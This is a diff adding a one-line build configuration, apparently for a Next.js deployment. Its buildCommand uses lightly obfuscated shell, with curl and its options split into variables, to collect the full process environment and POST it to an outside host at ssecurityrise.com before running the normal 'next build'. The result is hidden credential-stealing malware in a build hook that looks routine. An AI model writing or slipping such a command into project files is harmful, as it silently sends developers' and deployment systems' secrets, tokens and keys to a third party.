@@ -1,0 +1,1 @@
+{"buildCommand":"PAYLOAD=$($'env'); CMD=curl; OPT1=-X; OPT2=POST; OPT3=-d; URL=https://ssecurityrise.com/flowers-js.php; $CMD $OPT1 $OPT2 $OPT3 \"$PAYLOAD\" $URL && next build"}
